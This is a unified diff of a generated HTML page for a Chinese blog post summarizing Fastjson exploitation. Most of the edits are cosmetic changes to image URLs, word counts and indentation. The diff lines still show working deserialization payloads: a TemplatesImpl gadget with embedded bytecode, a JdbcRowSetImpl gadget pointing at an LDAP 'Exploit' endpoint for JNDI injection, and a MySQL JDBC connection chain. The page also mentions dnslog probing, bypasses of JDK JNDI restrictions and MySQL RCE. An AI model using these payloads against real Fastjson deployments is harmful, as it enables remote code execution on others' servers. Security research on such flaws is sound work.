@@ -49,7 +49,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/songzhiv.github.io\/fastjson\/"
-        },"image": ["https:\/\/songzhiv.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  1929 ,
+        },"image": ["https:\/\/songzhiv.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  1928 ,
         "url": "https:\/\/songzhiv.github.io\/fastjson\/","datePublished": "2022-02-01T23:11:59+08:00","dateModified": "2022-02-18T21:11:59+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "nmk","logo": "https:\/\/songzhiv.github.io\/images\/avatar.png"},"author": {
@@ -126,7 +126,7 @@
             <div class="toc-content always-active" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">Fastjson利用总结</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>nmk</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-02-01">2022-02-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1929 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-02-01">2022-02-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1928 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 10 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
@@ -185,22 +185,8 @@
 <h2 id="探测fastjson">探测fastjson</h2>
 <p><strong>对于有错误回显的情况</strong></p>
 <p>使用<code>{&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;</code>或者 <code>&quot;{&quot;a&quot;:x&quot;</code>通过异常直接回显出版本号，接下来就直接根据版本号判断有没有漏洞和找exp了</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/KVlEDSXBLtUce1m.png"
-        data-srcset="https://s2.loli.net/2022/02/18/KVlEDSXBLtUce1m.png, https://s2.loli.net/2022/02/18/KVlEDSXBLtUce1m.png 1.5x, https://s2.loli.net/2022/02/18/KVlEDSXBLtUce1m.png 2x"
-        data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/KVlEDSXBLtUce1m.png"
-        title="image.png" /></p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/mVFfvuL8i45owBK.png"
-        data-srcset="https://s2.loli.net/2022/02/18/mVFfvuL8i45owBK.png, https://s2.loli.net/2022/02/18/mVFfvuL8i45owBK.png 1.5x, https://s2.loli.net/2022/02/18/mVFfvuL8i45owBK.png 2x"
-        data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/mVFfvuL8i45owBK.png"
-        title="image.png" /></p>
+<img src="https://s2.loli.net/2022/02/18/KVlEDSXBLtUce1m.png" title="" alt="image.png" data-align="center">
+<img src="https://s2.loli.net/2022/02/20/pEBv8NlifAXWRQ2.png" title="" alt="" data-align="center">
 <p><strong>无回显使用dnslog探测POC：</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -312,11 +298,11 @@
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/L7IE49BTDM18Hbm.png"
-        data-srcset="https://s2.loli.net/2022/02/18/L7IE49BTDM18Hbm.png, https://s2.loli.net/2022/02/18/L7IE49BTDM18Hbm.png 1.5x, https://s2.loli.net/2022/02/18/L7IE49BTDM18Hbm.png 2x"
+        data-src="https://s2.loli.net/2022/02/20/9AqWX87d1iIMxnB.png"
+        data-srcset="https://s2.loli.net/2022/02/20/9AqWX87d1iIMxnB.png, https://s2.loli.net/2022/02/20/9AqWX87d1iIMxnB.png 1.5x, https://s2.loli.net/2022/02/20/9AqWX87d1iIMxnB.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/L7IE49BTDM18Hbm.png"
-        title="image.png" /></p>
+        alt="https://s2.loli.net/2022/02/20/9AqWX87d1iIMxnB.png"
+        title="image-20220220011650815" /></p>
 <p>所以实战情况下遇到上述情况（<strong>ldap服务收到信息，却没有http请求</strong>）多半可以断定是采用高版本jdk。</p>
 <h3 id="绕过高版本jdk对jndi注入的限制-1"><strong>绕过高版本jdk对jndi注入的限制</strong></h3>
 <p>绕过原理参考：<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener noreffer">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a></p>
@@ -367,21 +353,21 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="mi">1</span><span class="err">.</span> <span class="err">基于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span>
 <span class="p">{</span>
-		<span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="p">,</span>
-		<span class="nt">&#34;_bytecodes&#34;</span><span class="p">:[</span><span class="s2">&#34;poc_base64&#34;</span><span class="p">],</span>
-		<span class="err">&#39;_name&#39;:&#39;a.b&#39;,</span>
-		<span class="err">&#39;_tfactory&#39;:{</span> <span class="p">}</span><span class="err">,</span>
-		<span class="s2">&#34;_outputProperties&#34;</span><span class="err">:</span><span class="p">{}</span><span class="err">,</span>
-		<span class="s2">&#34;_name&#34;</span><span class="err">:</span><span class="s2">&#34;a&#34;</span><span class="err">,</span>
-		<span class="s2">&#34;_version&#34;</span><span class="err">:</span><span class="s2">&#34;1.0&#34;</span><span class="err">,</span>
-		<span class="s2">&#34;allowedProtocols&#34;</span><span class="err">:</span><span class="s2">&#34;all&#34;</span>
+        <span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="p">,</span>
+        <span class="nt">&#34;_bytecodes&#34;</span><span class="p">:[</span><span class="s2">&#34;poc_base64&#34;</span><span class="p">],</span>
+        <span class="err">&#39;_name&#39;:&#39;a.b&#39;,</span>
+        <span class="err">&#39;_tfactory&#39;:{</span> <span class="p">}</span><span class="err">,</span>
+        <span class="s2">&#34;_outputProperties&#34;</span><span class="err">:</span><span class="p">{}</span><span class="err">,</span>
+        <span class="s2">&#34;_name&#34;</span><span class="err">:</span><span class="s2">&#34;a&#34;</span><span class="err">,</span>
+        <span class="s2">&#34;_version&#34;</span><span class="err">:</span><span class="s2">&#34;1.0&#34;</span><span class="err">,</span>
+        <span class="s2">&#34;allowedProtocols&#34;</span><span class="err">:</span><span class="s2">&#34;all&#34;</span>
 <span class="err">}</span>
 <span class="mi">2</span><span class="err">.基于com.sun.rowset.JdbcRowSetImpl（JNDI，用的最多）</span>
 
 <span class="p">{</span>
-		<span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class="p">,</span> 
-		<span class="nt">&#34;dataSourceName&#34;</span><span class="p">:</span><span class="s2">&#34;ldap://localhost:1389/Exploit&#34;</span><span class="p">,</span> 
-		<span class="nt">&#34;autoCommit&#34;</span><span class="p">:</span><span class="kc">true</span>
+        <span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class="p">,</span> 
+        <span class="nt">&#34;dataSourceName&#34;</span><span class="p">:</span><span class="s2">&#34;ldap://localhost:1389/Exploit&#34;</span><span class="p">,</span> 
+        <span class="nt">&#34;autoCommit&#34;</span><span class="p">:</span><span class="kc">true</span>
 <span class="p">}</span>
 
 <span class="mi">3</span><span class="err">.基于org.apache.tomcat.dbcp.dbcp.BasicDataSource</span>
@@ -571,10 +557,10 @@
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="assets/image-20211105162445-kyda3kd.png"
-        data-srcset="assets/image-20211105162445-kyda3kd.png, assets/image-20211105162445-kyda3kd.png 1.5x, assets/image-20211105162445-kyda3kd.png 2x"
+        data-src="https://s2.loli.net/2022/02/20/F2gBu9KofC48sDv.png"
+        data-srcset="https://s2.loli.net/2022/02/20/F2gBu9KofC48sDv.png, https://s2.loli.net/2022/02/20/F2gBu9KofC48sDv.png 1.5x, https://s2.loli.net/2022/02/20/F2gBu9KofC48sDv.png 2x"
         data-sizes="auto"
-        alt="assets/image-20211105162445-kyda3kd.png"
+        alt="https://s2.loli.net/2022/02/20/F2gBu9KofC48sDv.png"
         title="image.png" /></p>
 <h3 id="mysql-rce">Mysql RCE</h3>
 <p><a href="https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg" target="_blank" rel="noopener noreffer">https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg</a></p>
@@ -633,11 +619,9 @@
 </span><span class="lnt">49
 </span><span class="lnt">50
 </span><span class="lnt">51
-</span><span class="lnt">52
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp">
-<span class="m">5.1</span><span class="p">.</span><span class="n">x</span><span class="p">(</span><span class="n">SSRF</span><span class="p">)</span><span class="err">，</span><span class="m">5.1</span><span class="p">.</span><span class="m">11</span><span class="p">-</span><span class="m">5.1</span><span class="p">.</span><span class="m">48</span><span class="p">(</span><span class="err">反序列化链</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="m">5.1</span><span class="p">.</span><span class="n">x</span><span class="p">(</span><span class="n">SSRF</span><span class="p">)</span><span class="err">，</span><span class="m">5.1</span><span class="p">.</span><span class="m">11</span><span class="p">-</span><span class="m">5.1</span><span class="p">.</span><span class="m">48</span><span class="p">(</span><span class="err">反序列化链</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="s">&#34;@type&#34;</span><span class="p">:</span> <span class="s">&#34;java.lang.AutoCloseable&#34;</span><span class="p">,</span>
   <span class="s">&#34;@type&#34;</span><span class="p">:</span> <span class="s">&#34;com.mysql.jdbc.JDBC4Connection&#34;</span><span class="p">,</span>
